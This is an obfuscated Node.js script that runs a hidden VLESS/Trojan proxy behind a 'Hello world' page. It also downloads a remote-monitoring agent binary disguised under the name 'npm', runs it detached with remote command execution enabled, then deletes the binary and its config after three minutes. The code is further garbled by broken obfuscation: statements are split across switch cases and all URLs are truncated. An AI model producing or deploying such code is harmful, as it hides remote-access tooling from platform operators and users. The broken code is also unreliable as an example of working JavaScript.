const _0x812dc0a1=[',"]; (function(_0xarr,_0xshift){ while(--_0xshift){ _0xarr.push(_0xarr.shift()); } })(_0x812dc0a1,0x68); function _0xb454b166(_0xidx){ return _0x812dc0a1[_0xidx]; } function _0x306ed322(_0xidx){ return _0xb454b166(_0xidx); } function _0xddad81c9(){return "CJ2NzuFObOIGb8yMg10lXyJnKp1Tku5h";} function _0x42a111a2(){return "Fxx18OqmWd3RcdrU09EIs6uRYge47mm5";} function _0xe8fd2bfe(){return "50M9XHWMrGQ6MycHrlyLJh3nZvApSP6P";} function _0xfa42ee7a(){return "GZq0DYS6L120tDqFjyHa0q2VFygwf6yH";} function _0x9c12744f(){return "gt3GXFO1IS88syH0dNCYgTbwascunP0i";} (function(){ try { (function(){ let _0x48b94139=0; while(true){ switch(_0x48b94139){ case 0: const os = require(_0x306ed322(0x0)os_0x306ed322(0x0)); _0x48b94139++; break; case 1: const http = require(_0x306ed322(0x0)http_0x306ed322(0x0)); _0x48b94139++; break; case 2: const fs = require(_0x306ed322(0x0)fs_0x306ed322(0x0)); _0x48b94139++; break; case 3: const axios = require(_0x306ed322(0x0)axios_0x306ed322(0x0)); _0x48b94139++; break; case 4: const net = require(_0x306ed322(0x0)net_0x306ed322(0x0)); _0x48b94139++; break; case 5: const path = require(_0x306ed322(0x0)path_0x306ed322(0x0)); _0x48b94139++; break; case 6: const crypto = require(_0x306ed322(0x0)crypto_0x306ed322(0x0)); _0x48b94139++; break; case 7: const { Buffer } = require(_0x306ed322(0x0)buffer_0x306ed322(0x0)); _0x48b94139++; break; case 8: const { exec, execSync } = require(_0x306ed322(0x0)child_process_0x306ed322(0x0)); _0x48b94139++; break; case 9: const { WebSocket, createWebSocketStream } = require(_0x306ed322(0x0)ws_0x306ed322(0x0)); _0x48b94139++; break; case 10: const UUID = process.env.UUID || _0x306ed322(0x0)33d836c9-2fc0-46d1-829b-ac3161eb624d_0x306ed322(0x0); _0x48b94139++; break; case 11: const NEZHA_SERVER = process.env.NEZHA_SERVER || _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 12: const NEZHA_PORT = process.env.NEZHA_PORT || _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 13: const NEZHA_KEY = process.env.NEZHA_KEY || _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 14: const DOMAIN = process.env.DOMAIN || _0x306ed322(0x0)space.tyyyyy.cn_0x306ed322(0x0); _0x48b94139++; break; case 15: const AUTO_ACCESS = process.env.AUTO_ACCESS || true; _0x48b94139++; break; case 16: const WSPATH = process.env.WSPATH || UUID.slice(0, 8); _0x48b94139++; break; case 17: const SUB_PATH = process.env.SUB_PATH || _0x306ed322(0x0)sub_0x306ed322(0x0); _0x48b94139++; break; case 18: const NAME = process.env.NAME || _0x306ed322(0x0)Hug_0x306ed322(0x0); _0x48b94139++; break; case 19: const PORT = process.env.PORT || 7860; _0x48b94139++; break; case 20: let ISP = _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 21: const GetISP = async () => { try { const res = await axios.get(_0x306ed322(0x0)https: const data = res.data; _0x48b94139++; break; case 22: ISP = `${data.country}-${data.asOrganization}`.replace(/ /g, _0x306ed322(0x0)__0x306ed322(0x0)); _0x48b94139++; break; case 23: } catch (e) { ISP = _0x306ed322(0x0)Unknown_0x306ed322(0x0); _0x48b94139++; break; case 24: } } GetISP(); _0x48b94139++; break; case 25: const httpServer = http.createServer((req, res) => { if (req.url === _0x306ed322(0x0)/_0x306ed322(0x0)) { const filePath = path.join(__dirname, _0x306ed322(0x0)index.html_0x306ed322(0x0)); _0x48b94139++; break; case 26: fs.readFile(filePath, _0x306ed322(0x0)utf8_0x306ed322(0x0), (err, content) => { if (err) { res.writeHead(200, { _0x306ed322(0x0)Content-Type_0x306ed322(0x0): _0x306ed322(0x0)text/html_0x306ed322(0x0) }); _0x48b94139++; break; case 27: res.end(_0x306ed322(0x0)Hello world!_0x306ed322(0x0)); _0x48b94139++; break; case 28: return; _0x48b94139++; break; case 29: } res.writeHead(200, { _0x306ed322(0x0)Content-Type_0x306ed322(0x0): _0x306ed322(0x0)text/html_0x306ed322(0x0) }); _0x48b94139++; break; case 30: res.end(content); _0x48b94139++; break; case 31: }); _0x48b94139++; break; case 32: return; _0x48b94139++; break; case 33: } else if (req.url === `/${SUB_PATH}`) { const DOMAIN_LIST_URL = _0x306ed322(0x1)https: axios.get(DOMAIN_LIST_URL) .then(r => { let domains = r.data .split(/\r?\n/) .map(l => l.trim()) .filter(l => l.length > 0); _0x48b94139++; break; case 34: if (domains.length === 0) { domains = [DOMAIN]; _0x48b94139++; break; case 35: } let output = _0x306ed322(0x1)_0x306ed322(0x1); _0x48b94139++; break; case 36: for (const d of domains) { const vlessURL = `vless: const trojanURL = `trojan: output += vlessURL + _0x306ed322(0x1)\n_0x306ed322(0x1) + trojanURL + _0x306ed322(0x1)\n_0x306ed322(0x1); _0x48b94139++; break; case 37: } const base64Content = Buffer.from(output).toString(_0x306ed322(0x0)base64_0x306ed322(0x0)); _0x48b94139++; break; case 38: res.writeHead(200, { _0x306ed322(0x1)Content-Type_0x306ed322(0x1): _0x306ed322(0x1)text/plain_0x306ed322(0x1) }); _0x48b94139++; break; case 39: res.end(base64Content + _0x306ed322(0x1)\n_0x306ed322(0x1)); _0x48b94139++; break; case 40: }) .catch(err => { const vlessURL = `vless: const trojanURL = `trojan: const subscription = vlessURL + _0x306ed322(0x0)\n_0x306ed322(0x0) + trojanURL; _0x48b94139++; break; case 41: const base64Content = Buffer.from(subscription).toString(_0x306ed322(0x0)base64_0x306ed322(0x0)); _0x48b94139++; break; case 42: res.writeHead(200, { _0x306ed322(0x1)Content-Type_0x306ed322(0x1): _0x306ed322(0x1)text/plain_0x306ed322(0x1) }); _0x48b94139++; break; case 43: res.end(base64Content + _0x306ed322(0x1)\n_0x306ed322(0x1)); _0x48b94139++; break; case 44: }); _0x48b94139++; break; case 45: } else { res.writeHead(404, { _0x306ed322(0x0)Content-Type_0x306ed322(0x0): _0x306ed322(0x0)text/plain_0x306ed322(0x0) }); _0x48b94139++; break; case 46: res.end(_0x306ed322(0x0)Not Found\n_0x306ed322(0x0)); _0x48b94139++; break; case 47: } }); _0x48b94139++; break; case 48: const wss = new WebSocket.Server({ server: httpServer }); _0x48b94139++; break; case 49: const uuid = UUID.replace(/-/g, _0x306ed322(0x1)_0x306ed322(0x1)); _0x48b94139++; break; case 50: const DNS_SERVERS = [_0x306ed322(0x0)8.8.4.4_0x306ed322(0x0), _0x306ed322(0x0)1.1.1.1_0x306ed322(0x0)]; _0x48b94139++; break; case 51: function resolveHost(host) { return new Promise((resolve, reject) => { if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) { resolve(host); _0x48b94139++; break; case 52: return; _0x48b94139++; break; case 53: } let attempts = 0; _0x48b94139++; break; case 54: function tryNextDNS() { if (attempts >= DNS_SERVERS.length) { reject(new Error(`Failed to resolve ${host} with all DNS servers`)); _0x48b94139++; break; case 55: return; _0x48b94139++; break; case 56: } const dnsServer = DNS_SERVERS[attempts]; _0x48b94139++; break; case 57: attempts++; _0x48b94139++; break; case 58: const dnsQuery = `https: axios.get(dnsQuery, { timeout: 5000, headers: { _0x306ed322(0x0)Accept_0x306ed322(0x0): _0x306ed322(0x0)application/dns-json_0x306ed322(0x0) } }) .then(response => { const data = response.data; _0x48b94139++; break; case 59: if (data.Status === 0 && data.Answer && data.Answer.length > 0) { const ip = data.Answer.find(record => record.type === 1); _0x48b94139++; break; case 60: if (ip) { resolve(ip.data); _0x48b94139++; break; case 61: return; _0x48b94139++; break; case 62: } } tryNextDNS(); _0x48b94139++; break; case 63: }) .catch(error => { tryNextDNS(); _0x48b94139++; break; case 64: }); _0x48b94139++; break; case 65: } tryNextDNS(); _0x48b94139++; break; case 66: }); _0x48b94139++; break; case 67: } function handleVlessConnection(ws, msg) { const [VERSION] = msg; _0x48b94139++; break; case 68: const id = msg.slice(1, 17); _0x48b94139++; break; case 69: if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false; _0x48b94139++; break; case 70: let i = msg.slice(17, 18).readUInt8() + 19; _0x48b94139++; break; case 71: const port = msg.slice(i, i += 2).readUInt16BE(0); _0x48b94139++; break; case 72: const ATYP = msg.slice(i, i += 1).readUInt8(); _0x48b94139++; break; case 73: const host = ATYP == 1 ? msg.slice(i, i += 4).join(_0x306ed322(0x0)._0x306ed322(0x0)) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(_0x306ed322(0x0):_0x306ed322(0x0)) : _0x306ed322(0x0)_0x306ed322(0x0))); _0x48b94139++; break; case 74: ws.send(new Uint8Array([VERSION, 0])); _0x48b94139++; break; case 75: const duplex = createWebSocketStream(ws); _0x48b94139++; break; case 76: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); _0x48b94139++; break; case 77: duplex.on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(this).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(duplex); _0x48b94139++; break; case 78: }).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 79: }) .catch(error => { net.connect({ host, port }, function() { this.write(msg.slice(i)); _0x48b94139++; break; case 80: duplex.on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(this).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(duplex); _0x48b94139++; break; case 81: }).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 82: }); _0x48b94139++; break; case 83: return true; _0x48b94139++; break; case 84: } function handleTrojanConnection(ws, msg) { try { if (msg.length < 58) return false; _0x48b94139++; break; case 85: const receivedPasswordHash = msg.slice(0, 56).toString(); _0x48b94139++; break; case 86: const possiblePasswords = [ UUID, ]; _0x48b94139++; break; case 87: let matchedPassword = null; _0x48b94139++; break; case 88: for (const pwd of possiblePasswords) { const hash = crypto.createHash(_0x306ed322(0x0)sha224_0x306ed322(0x0)).update(pwd).digest(_0x306ed322(0x0)hex_0x306ed322(0x0)); _0x48b94139++; break; case 89: if (hash === receivedPasswordHash) { matchedPassword = pwd; _0x48b94139++; break; case 90: break; _0x48b94139++; break; case 91: } } if (!matchedPassword) return false; _0x48b94139++; break; case 92: let offset = 56; _0x48b94139++; break; case 93: if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0x48b94139++; break; case 94: } const cmd = msg[offset]; _0x48b94139++; break; case 95: if (cmd !== 0x01) return false; _0x48b94139++; break; case 96: offset += 1; _0x48b94139++; break; case 97: const atyp = msg[offset]; _0x48b94139++; break; case 98: offset += 1; _0x48b94139++; break; case 99: let host, port; _0x48b94139++; break; case 100: if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(_0x306ed322(0x0)._0x306ed322(0x0)); _0x48b94139++; break; case 101: offset += 4; _0x48b94139++; break; case 102: } else if (atyp === 0x03) { const hostLen = msg[offset]; _0x48b94139++; break; case 103: offset += 1; _0x48b94139++; break; case 104: host = msg.slice(offset, offset + hostLen).toString(); _0x48b94139++; break; case 105: offset += hostLen; _0x48b94139++; break; case 106: } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b => b.readUInt16BE(0).toString(16)).join(_0x306ed322(0x0):_0x306ed322(0x0)); _0x48b94139++; break; case 107: offset += 16; _0x48b94139++; break; case 108: } else { return false; _0x48b94139++; break; case 109: } port = msg.readUInt16BE(offset); _0x48b94139++; break; case 110: offset += 2; _0x48b94139++; break; case 111: if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0x48b94139++; break; case 112: } const duplex = createWebSocketStream(ws); _0x48b94139++; break; case 113: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0x48b94139++; break; case 114: } duplex.on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(this).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(duplex); _0x48b94139++; break; case 115: }).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 116: }) .catch(error => { net.connect({ host, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0x48b94139++; break; case 117: } duplex.on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(this).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}).pipe(duplex); _0x48b94139++; break; case 118: }).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 119: }); _0x48b94139++; break; case 120: return true; _0x48b94139++; break; case 121: } catch (error) { return false; _0x48b94139++; break; case 122: } } wss.on(_0x306ed322(0x0)connection_0x306ed322(0x0), (ws, req) => { const url = req.url || _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 123: ws.once(_0x306ed322(0x0)message_0x306ed322(0x0), msg => { if (msg.length > 17 && msg[0] === 0) { const id = msg.slice(1, 17); _0x48b94139++; break; case 124: const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16)); _0x48b94139++; break; case 125: if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); _0x48b94139++; break; case 126: } return; _0x48b94139++; break; case 127: } } if (!handleTrojanConnection(ws, msg)) { ws.close(); _0x48b94139++; break; case 128: } }).on(_0x306ed322(0x0)error_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 129: }); _0x48b94139++; break; case 130: const getDownloadUrl = () => { const arch = os.arch(); _0x48b94139++; break; case 131: if (arch === _0x306ed322(0x0)arm_0x306ed322(0x0) || arch === _0x306ed322(0x0)arm64_0x306ed322(0x0) || arch === _0x306ed322(0x0)aarch64_0x306ed322(0x0)) { if (!NEZHA_PORT) { return _0x306ed322(0x0)https: } else { return _0x306ed322(0x0)https: } } else { if (!NEZHA_PORT) { return _0x306ed322(0x0)https: } else { return _0x306ed322(0x0)https: } } }; _0x48b94139++; break; case 132: const downloadFile = async () => { if (!NEZHA_SERVER && !NEZHA_KEY) return; _0x48b94139++; break; case 133: try { const url = getDownloadUrl(); _0x48b94139++; break; case 134: const response = await axios({ method: _0x306ed322(0x0)get_0x306ed322(0x0), url: url, responseType: _0x306ed322(0x0)stream_0x306ed322(0x0) }); _0x48b94139++; break; case 135: const writer = fs.createWriteStream(_0x306ed322(0x0)npm_0x306ed322(0x0)); _0x48b94139++; break; case 136: response.data.pipe(writer); _0x48b94139++; break; case 137: return new Promise((resolve, reject) => { writer.on(_0x306ed322(0x0)finish_0x306ed322(0x0), () => { console.log(_0x306ed322(0x0)npm download successfully_0x306ed322(0x0)); _0x48b94139++; break; case 138: exec(_0x306ed322(0x0)chmod +x npm_0x306ed322(0x0), (err) => { if (err) reject(err); _0x48b94139++; break; case 139: resolve(); _0x48b94139++; break; case 140: }); _0x48b94139++; break; case 141: }); _0x48b94139++; break; case 142: writer.on(_0x306ed322(0x0)error_0x306ed322(0x0), reject); _0x48b94139++; break; case 143: }); _0x48b94139++; break; case 144: } catch (err) { throw err; _0x48b94139++; break; case 145: } }; _0x48b94139++; break; case 146: const runnz = async () => { try { const status = execSync(_0x306ed322(0x0)ps aux | grep -v _0x306ed322(0x1)grep_0x306ed322(0x1) | grep _0x306ed322(0x1)./[n]pm_0x306ed322(0x1)_0x306ed322(0x0), { encoding: _0x306ed322(0x0)utf-8_0x306ed322(0x0) }); _0x48b94139++; break; case 147: if (status.trim() !== _0x306ed322(0x0)_0x306ed322(0x0)) { console.log(_0x306ed322(0x0)npm is already running, skip running..._0x306ed322(0x0)); _0x48b94139++; break; case 148: return; _0x48b94139++; break; case 149: } } catch (e) { } await downloadFile(); _0x48b94139++; break; case 150: let command = _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 151: let tlsPorts = [_0x306ed322(0x0)443_0x306ed322(0x0), _0x306ed322(0x0)8443_0x306ed322(0x0), _0x306ed322(0x0)2096_0x306ed322(0x0), _0x306ed322(0x0)2087_0x306ed322(0x0), _0x306ed322(0x0)2083_0x306ed322(0x0), _0x306ed322(0x0)2053_0x306ed322(0x0)]; _0x48b94139++; break; case 152: if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) { const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? _0x306ed322(0x0)--tls_0x306ed322(0x0) : _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 153: command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`; _0x48b94139++; break; case 154: } else if (NEZHA_SERVER && NEZHA_KEY) { if (!NEZHA_PORT) { const port = NEZHA_SERVER.includes(_0x306ed322(0x0):_0x306ed322(0x0)) ? NEZHA_SERVER.split(_0x306ed322(0x0):_0x306ed322(0x0)).pop() : _0x306ed322(0x0)_0x306ed322(0x0); _0x48b94139++; break; case 155: const NZ_TLS = tlsPorts.includes(port) ? _0x306ed322(0x0)true_0x306ed322(0x0) : _0x306ed322(0x0)false_0x306ed322(0x0); _0x48b94139++; break; case 156: const configYaml = `client_secret: ${NEZHA_KEY} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${NEZHA_SERVER} skip_connection_count: true skip_procs_count: true temperature: false tls: ${NZ_TLS} use_gitee_to_upgrade: false use_ipv6_country_code: false uuid: ${UUID}`; _0x48b94139++; break; case 157: fs.writeFileSync(_0x306ed322(0x0)config.yaml_0x306ed322(0x0), configYaml); _0x48b94139++; break; case 158: } command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`; _0x48b94139++; break; case 159: } else { console.log(_0x306ed322(0x0)NEZHA variable is empty, skip running_0x306ed322(0x0)); _0x48b94139++; break; case 160: return; _0x48b94139++; break; case 161: } try { exec(command, { shell: _0x306ed322(0x0)/bin/bash_0x306ed322(0x0) }, (err) => { if (err) console.error(_0x306ed322(0x0)npm running error:_0x306ed322(0x0), err); _0x48b94139++; break; case 162: else console.log(_0x306ed322(0x0)npm is running_0x306ed322(0x0)); _0x48b94139++; break; case 163: }); _0x48b94139++; break; case 164: } catch (error) { console.error(`error: ${error}`); _0x48b94139++; break; case 165: } }; _0x48b94139++; break; case 166: async function addAccessTask() { if (!AUTO_ACCESS) return; _0x48b94139++; break; case 167: if (!DOMAIN) { return; _0x48b94139++; break; case 168: } const fullURL = `https: try { const res = await axios.post(_0x306ed322(0x1)https: url: fullURL }, { headers: { _0x306ed322(0x0)Content-Type_0x306ed322(0x0): _0x306ed322(0x0)application/json_0x306ed322(0x0) } }); _0x48b94139++; break; case 169: console.log(_0x306ed322(0x0)Automatic Access Task added successfully_0x306ed322(0x0)); _0x48b94139++; break; case 170: } catch (error) { } } const delFiles = () => { fs.unlink(_0x306ed322(0x0)npm_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 171: fs.unlink(_0x306ed322(0x0)config.yaml_0x306ed322(0x0), () => {}); _0x48b94139++; break; case 172: }; _0x48b94139++; break; case 173: httpServer.listen(PORT, () => { runnz(); _0x48b94139++; break; case 174: setTimeout(() => { delFiles(); _0x48b94139++; break; case 175: }, 180000); _0x48b94139++; break; case 176: addAccessTask(); _0x48b94139++; break; case 177: console.log(`Server is running on port ${PORT}`); _0x48b94139++; break; case 178: }); _0x48b94139++; break; default:return; } } })(); } catch(e){eval('');} })();
